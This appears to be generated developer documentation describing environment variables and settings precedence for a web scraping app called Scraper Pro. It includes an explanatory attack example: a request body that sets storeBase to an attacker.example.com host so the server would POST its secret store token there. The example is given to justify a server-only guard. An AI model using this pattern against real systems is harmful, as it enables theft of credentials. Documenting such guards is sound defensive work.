> Generated: 2026-07-26 · Commit: 0f2c759 · Generator: make-docs

# Configuration

Scraper Pro reads configuration from three layers, resolved in a fixed order by
`resolveSettings()` in [`core/settings.ts`](../core/settings.ts): the database,
then process env vars, then the client request body. This page lists every
env var the code reads, the precedence rule itself, and the one deliberate
exception to it (`storeBase`/`storeToken`) that exists to stop a token-theft
attack.

There are **no `NEXT_PUBLIC_*` variables anywhere in this repo** — a
repo-wide grep for `NEXT_PUBLIC` returns zero matches outside this doc.
Nothing is client-bundled; every secret stays server-side. See
[Client-exposed variables](#client-exposed-variables-next_public_) below.

## Resolution precedence: DB → env → client

`resolveSettings(client)` (`core/settings.ts:57-78`) builds the effective
`Settings` object for every request (`/api/scrape`, `/api/discover`,
`/api/save`, `/api/config`, `/api/test`) like this:

```mermaid
flowchart LR
    A["app_config table<br/>(DB, admin-editable,<br/>AES-256-GCM at rest)"] -->|"db[k] set?"| D{resolveSettings}
    B["process.env[ENV_MAP[k]]<br/>(Vercel / .env)"] -->|"env set?"| D
    C["client request body<br/>(settings.* from the browser)"] -->|"only if not serverOnly"| D
    D --> E["effective Settings"]
```

The actual line (`core/settings.ts:75`):

```ts
(s as any)[k] = db[k] || process.env[ENV_MAP[k]] || (serverOnly ? undefined : (s as any)[k]) || undefined;
```

So for every key in `ENV_MAP` (`core/settings.ts:42-49`): a value saved in
the DB via the admin "Integrations & Keys" panel always wins; if the DB has
nothing, the env var wins; if neither is set, the client-supplied value from
the request body is used as a last resort — **except** for two keys.

### The `storeBase` / `storeToken` server-only guard

`storeBase` and `storeToken` are marked `serverOnly` and **never** fall back
to the client-supplied value (`core/settings.ts:74-75`):

```ts
// The store destination (base + token) is resolved SERVER-SIDE ONLY (DB → env), never from the
// client body — otherwise a caller could pair an attacker-controlled storeBase with the server's
// real storeToken and have us POST the secret token to their URL (token exfiltration).
const serverOnly = k === 'storeBase' || k === 'storeToken';
```

Without this guard, a caller of `/api/save` could send
`{ settings: { storeBase: 'https://attacker.example.com' } }` and, if
`storeToken` fell back to the client value's absence, the server would still
resolve its own real `STORE_IMPORT_TOKEN` (from DB/env) and POST it — with
the product payload — to the attacker's URL. Pinning both `storeBase` and
`storeToken` to DB/env-only closes that hole. This is real, load-bearing
security logic, not defensive boilerplate — treat it as a guard rail if you
ever refactor `resolveSettings`.

In production, the same "destination" resolution is layered again in
`app/api/save/route.ts:27-39`: an explicit `storeId` (row in the `stores`
table) or the DB default store is preferred over the legacy single
`STORE_BASE`/`STORE_IMPORT_TOKEN` pair — see
[DATABASE.md](./DATABASE.md#stores) for the `stores` table shape.

### The `RESEND_*` exception: a second, parallel resolver

`RESEND_API_KEY` and `RESEND_FROM` are the only `ENV_MAP` keys **not**
resolved through `resolveSettings`. `core/mailer.ts` re-implements the same
DB → env order independently (no client fallback at all):

| Function | Behavior |
|---|---|
| `mailer` resend key (`core/mailer.ts:9`) | `process.env.RESEND_API_KEY \|\| ''` — DB read happens earlier in the same file, not shown here; env is the fallback |
| `mailer` resend from (`core/mailer.ts:13`) | `process.env.RESEND_FROM \|\| 'Scraper Pro <no-reply@baw-ai.dev>'` |

This is a known duplicate code path (see `docs/.facts.md`, "Settings
interface and resolution") — password-reset email config is resolved twice,
once in `core/settings.ts` (for the admin status UI) and once independently
in `core/mailer.ts` (for the actual send). Both land on the same DB
keys/env vars, so it isn't a correctness bug today, but a future change to
one resolver won't automatically apply to the other.

### What gets encrypted at rest

`saveConfigKeys()` (`core/settings.ts:97-106`) persists admin-panel-entered
values to the `app_config` table, encrypting everything **except** the
`NON_SECRET` allowlist (`core/settings.ts:54`):

```ts
const NON_SECRET = new Set(['storeBase', 'googleCseCx', 'resendFrom', 'discoveryProject', 'discoveryEngine', 'discoveryLocation', 'replicateModel']);
```

Everything else in `KEY_FIELDS` — every provider API key, `storeToken`, and
the admin-only `appPassword` extra key — is AES-256-GCM encrypted before it
touches the database (`core/db.ts:29-35`, key derived from `APP_SECRET`).
See [DATABASE.md](./DATABASE.md#app_config) for the encryption
implementation and table shape.

### Status endpoints never leak values

`GET /api/config` and `GET /api/status` both report **booleans only** —
whether a key is set and whether it came from `'db'` or `'env'`
(`configStatus()`, `core/settings.ts:81-94`; `app/api/status/route.ts:16-29`)
— never the value itself. Both require an authenticated session
(`requireRole`); see [API-REFERENCE.md](./API-REFERENCE.md) for the full
route table.

## Server-only variables

Every variable below is read only in server code (`route.ts` handlers,
`core/*.ts`) and never sent to the browser. "Required" reflects what happens
if the var is absent, not whether the app refuses to boot.

| Name | Required | Example (fake) | Used in (path:line) | Notes |
|---|---|---|---|---|
| `APP_SECRET` | **Yes in production** — throws if unset or `<16` chars when `NODE_ENV==='production'` | `f3a9c1e7b2d84a6f9c0e1b7d3a5f8c2e` | `core/auth.ts:18-24` (session HMAC key), `core/db.ts:22-26` (AES-256-GCM key) | Derives both the session-cookie signing key and the at-rest encryption key (SHA-256 of this value). Optional in dev — falls back to the literal `'dev-insecure-change-me'`. |
| `DATABASE_URL` | No overall; **required** for any DB-backed feature (encrypted config, stores/users CRUD) — those return `503` without it | `postgresql://user:FAKEPASSWORD@ep-fake-host.neon.tech/scraperpro?sslmode=require` | `core/db.ts:11,18` | `dbConfigured() = Boolean(process.env.DATABASE_URL)`. Neon Postgres connection string, lazily connected so a missing var never breaks the build. |
| `APP_PASSWORD` | No — app is **open by default** if unconfigured anywhere | `correct-horse-battery-staple` | `core/settings.ts:111`; `app/api/config/route.ts:18,23`; `app/api/status/route.ts:26,28` | Shared app-password gate, checked against the `x-app-password` request header. DB value (`app_config.appPassword`) wins over this env var if both are set. Fails **closed** on a DB read error. |
| `ANTHROPIC_API_KEY` | No — optional; primary AI provider, falls back to OpenAI if absent/erroring | `sk-ant-api03-FAKE00000000000000000000000000000000000000` | `core/settings.ts:43` (`ENV_MAP`), `:75` (resolved) | Product copywriting (en/ar/he) + image-role curation; also watermark bounding-box detection. |
| `OPENAI_API_KEY` | No — optional; enrichment/watermark fallback, opt-in bg-removal provider | `sk-proj-FAKE000000000000000000000000000000` | `core/settings.ts:44`, `:75` | Fallback for enrichment and watermark detect/inpaint; also the opt-in `gpt-image-1` background-removal provider. |
| `REPLICATE_API_TOKEN` | No — optional; gates the Replicate step in the bg-removal ladder | `r8_FAKE0000000000000000000000000` | `core/settings.ts:43`, `:75` | Highest-quality paid cutout, tried first in `bgMode:'auto'`. |
| `REPLICATE_MODEL` | No — optional, not a secret | `acme/product-bg-remover:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d` | `core/settings.ts:43`, `:75` | Overrides the default Replicate model; `owner/model:version` format. |
| `REMOVEBG_API_KEY` | No — optional; gates the remove.bg step | `FAKE1234567890removebgkey00000` | `core/settings.ts:43`, `:75` | Secondary paid cutout provider in the `auto` ladder. |
| `BG_LOCAL_MODEL` | No — optional, not a secret | `isnet-general-use` | `core/localbg.ts:43` | Selects the free local ONNX model: `isnet-general-use` (default) \| `silueta` \| `u2netp` \| `u2net`. No key required — this path always works. |
| `FIRECRAWL_API_KEY` | No — optional; gates Firecrawl render escalation + search | `fc-FAKE00000000000000000000000000` | `core/settings.ts:44`, `:75` | JS-rendered page fetch, web/product search, Instagram render fallback. |
| `GOOGLE_CSE_KEY` | No — optional; secondary/legacy image search | `AIzaSyFAKE0000000000000000000000000` | `core/settings.ts:44`, `:75` | Google Custom Search JSON API key (image mode). Paired with `GOOGLE_CSE_CX`. |
| `GOOGLE_CSE_CX` | No — optional, not a secret | `01234567890123456789a:bcdefghijkl` | `core/settings.ts:45`, `:75` | Custom Search engine ID. |
| `GOOGLE_SA_KEY` | No — optional; gates Google Vertex AI Search (Discovery Engine) | `{"type":"service_account","project_id":"fake-project","private_key":"-----BEGIN PRIVATE KEY-----\nFAKE...\n-----END PRIVATE KEY-----\n","client_email":"fake@fake-project.iam.gserviceaccount.com"}` | `core/settings.ts:47`, `:75`; consumed by `core/discovery.ts:37-38` → `core/googleauth.ts` | Raw or base64-encoded service-account JSON. Primary product-page/image search provider (replaces the deprecated/blocked CSE). |
| `GOOGLE_DISCOVERY_PROJECT` | No — has a code default | `601004755002` | `core/settings.ts:47`, `:75` | Default is the literal `'601004755002'` (`core/discovery.ts:16`). |
| `GOOGLE_DISCOVERY_ENGINE` | No — has a code default | `product-image-search_1785023650361` | `core/settings.ts:48`, `:75` | Default is `'product-image-search_1785023650361'` (`core/discovery.ts:17`). |
| `GOOGLE_DISCOVERY_LOCATION` | No — has a code default | `global` | `core/settings.ts:48`, `:75` | Default `'global'` (`core/discovery.ts:18`). |
| `STORE_BASE` | No — optional legacy default store; the DB `stores` table supersedes it | `https://store.example.com` | `core/settings.ts:45` (`ENV_MAP`), `:74-75` (server-only resolution) | **Server-only** — never falls back to a client-supplied value (see [precedence guard](#the-storebase--storetoken-server-only-guard) above). |
| `STORE_IMPORT_TOKEN` | No — optional | `sit_FAKE0000000000000000000000000` | `core/settings.ts:45`, `:74-75` | **Server-only**, same guard as `STORE_BASE`. Shared-secret header (`X-Scraper-Token`) sent to `{STORE_BASE}/api/scraper/import`. |
| `RESEND_API_KEY` | No — optional; password-reset email is best-effort (errors swallowed) | `re_FAKE00000000000000000000000` | `core/settings.ts:46`, `:75`; also read directly (bypassing `resolveSettings`) at `core/mailer.ts:9` | See [the RESEND exception](#the-resend_-exception-a-second-parallel-resolver) above — resolved twice, independently. |
| `RESEND_FROM` | No — optional, has a code default, not a secret | `Scraper Pro <no-reply@example.com>` | `core/settings.ts:46`, `:75`; also read directly at `core/mailer.ts:13` | Default `'Scraper Pro <no-reply@baw-ai.dev>'`. |
| `APP_URL` | No — optional; falls back to an allow-listed host set | `https://scraper.example.com` | `app/api/auth/request-reset/route.ts:31` | Builds the password-reset link host **safely** — never derived from the untrusted `Host` header. Fallback host set: `baw-ai.dev`, `admin.baw-ai.dev`, `scraper-pro-zeta.vercel.app`, else `https://baw-ai.dev`. |
| `COOKIE_DOMAIN` | No — optional | `.example.com` | `core/auth.ts:87` | Sets the session cookie's `Domain=` attribute. Unset means host-only cookie. |
| `NODE_ENV` | N/A — standard Next.js/infra var | `production` | `core/db.ts:24`; `core/auth.ts:21,88` | Drives production fail-closed behavior for `APP_SECRET` and enables the `Secure` cookie attribute. Set automatically by Next.js/Vercel — do not set manually in most cases. |
| `DAILY_DISCOVER_CAP` | No — has a default (150), not a secret | `150` | `app/api/discover/route.ts:98,100` | Per-user daily cap on `POST /api/discover` calls, counted via `bumpCounter('discover:{uid}')`. |
| `DAILY_RUN_CAP` | No — has a default (400), not a secret | `400` | `app/api/scrape/route.ts:30,33` | Per-user daily cap on `POST /api/scrape` calls, counted via `bumpCounter('scrape:{uid}')`. |
| `SCRAPER_ALLOW_PRIVATE` | No — optional SSRF-guard override, off by default | `1` | `core/extract.ts:48` | Setting to `'1'` **disables** the private-IP SSRF guard (`assertPublicUrl`). Leave unset in every real deployment — see [Runbook](./RUNBOOK.md) if you ever need this for local testing against an internal host. |

## Client-exposed variables (`NEXT_PUBLIC_`)

None exist. A repo-wide grep for `NEXT_PUBLIC` matches nothing outside this
documentation file. Every setting the browser can influence (image size,
quality, formats, `bgMode`, sliders, etc.) is a plain client-side React
state value in `components/App.tsx`, sent as part of the JSON request body
(`settings: {...}`) on each API call — it is never baked into the Next.js
build as a `NEXT_PUBLIC_*` env var, and never includes secrets (see the
[precedence rule](#resolution-precedence-db--env--client) above for why
client-supplied values can only ever *fill gaps*, never override DB/env,
and can never supply `storeBase`/`storeToken` at all).

## Per-environment notes

### Local development

- Copy [`.env.example`](../.env.example) to `.env` (or `.env.local`) —
  `.gitignore:4-5` ignores `.env*` except `.env.example`, so any local env
  file you create stays untracked.
- `.env.example` ships with only 11 of the 26 vars above pre-listed
  (`APP_PASSWORD`, `REPLICATE_API_TOKEN`, `REMOVEBG_API_KEY`,
  `BG_LOCAL_MODEL`, `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`,
  `FIRECRAWL_API_KEY`, `GOOGLE_CSE_KEY`, `GOOGLE_CSE_CX`, `STORE_BASE`,
  `STORE_IMPORT_TOKEN`, plus a commented-out `SCRAPER_ALLOW_PRIVATE`) — all
  of them marked optional in the file's own header comment. `DATABASE_URL`,
  `APP_SECRET`, `GOOGLE_SA_KEY`, the `GOOGLE_DISCOVERY_*` trio,
  `RESEND_API_KEY`/`RESEND_FROM`, `COOKIE_DOMAIN`, `DAILY_DISCOVER_CAP`,
  `DAILY_RUN_CAP`, and `APP_URL` are real, code-supported vars that are
  **not** in `.env.example` — add them manually if you need them locally.
  > ⚠️ TODO(owner): confirm whether `.env.example`'s omission of
  > `DATABASE_URL`/`APP_SECRET` is intentional (e.g. "most devs don't need a
  > local DB") or just stale.
- With `NODE_ENV` not `'production'` (the default under `next dev`),
  `APP_SECRET` is optional — `core/auth.ts:18-24` and `core/db.ts:22-26`
  both fall back to the literal string `'dev-insecure-change-me'`. Session
  cookies and DB-at-rest encryption both use this fallback key in dev, so
  **do not** reuse a dev database in production and don't treat dev-encrypted
  values as secure.
- Without `DATABASE_URL` set locally, `dbConfigured()` is `false` — the app
  still runs, but `/api/config` POST, `/api/stores` POST/DELETE, and
  `/api/users` all return `503`, and every provider key must come from your
  local `.env` instead of the admin panel.
- Run with `pnpm dev` (`next dev -p 3111`, `package.json:7`) — see
  [README.md](../README.md) for the full quick-start.

### Vercel (production / preview)

- Env vars are set in **Vercel → Project → Settings → Environment
  Variables** (per `.env.example:1` and the README's own instructions) —
  not committed anywhere in the repo.
- **The DB (admin "Integrations & Keys" panel) wins over the env var**, not
  the other way around — `core/settings.ts:75`'s `db[k] || process.env[...]`
  order applies identically in production. Note: `.env.example:2-3`'s own
  comment says "Env values, when present, always WIN over UI values" — that
  comment does not match the actual `resolveSettings` precedence in the
  code; treat the code as authoritative.
  > ⚠️ TODO(owner): reconcile the `.env.example` comment with the real
  > DB-wins precedence in `core/settings.ts:75`, or confirm the comment
  > describes some other, undocumented behavior.
  All vars are optional for this reason — every provider key can instead be
  entered once through the admin "Integrations & Keys" panel and persists
  to Postgres, taking precedence over whatever is set in Vercel's env vars.
- `NODE_ENV=production` is set automatically by Vercel. This flips two
  fail-closed checks live: `APP_SECRET` must be set and ≥16 chars
  (`core/auth.ts:21-23`, `core/db.ts:24-26`) or every request throws, and
  session cookies gain the `Secure` attribute (`core/auth.ts:88`).
  **`APP_SECRET` is the one variable you cannot skip in production.**
- Per-route function overrides live in [`vercel.json`](../vercel.json), not
  as env vars — `app/api/scrape/route.ts` gets `maxDuration:300`,
  `memory:3009`; `app/api/save/route.ts` and `app/api/video-fetch/route.ts`
  get `maxDuration:300` with default memory. See
  [DEPLOYMENT.md](./DEPLOYMENT.md) for the full deploy flow.
- There is no separate documented staging environment in the repo — the
  closest equivalent is a Vercel Preview deployment, created via the manual
  `vercel` CLI flow (see [DEPLOYMENT.md](./DEPLOYMENT.md)).
  > ⚠️ TODO(owner): confirm whether Preview deployments run with
  > `NODE_ENV==='production'` (and therefore require `APP_SECRET` ≥16
  > chars) or not — `core/auth.ts:21` and `core/db.ts:24` only branch on
  > the literal string `'production'`, and this repo doesn't document
  > which value Vercel injects for Preview builds.

## See also

- [DATABASE.md](./DATABASE.md) — `app_config`/`stores`/`users` table shapes
  and the AES-256-GCM encryption implementation referenced above.
- [API-REFERENCE.md](./API-REFERENCE.md) — every route that reads these
  settings, including auth requirements.
- [DEPLOYMENT.md](./DEPLOYMENT.md) — the manual Vercel deploy flow and
  `vercel.json` function overrides.
- `docs/adr/` — the ADR on encrypted DB-first config vs. env-vars-only
  (rationale: multi-store tokens can't be expressed as one env var, and DB
  values are live-editable with no redeploy).
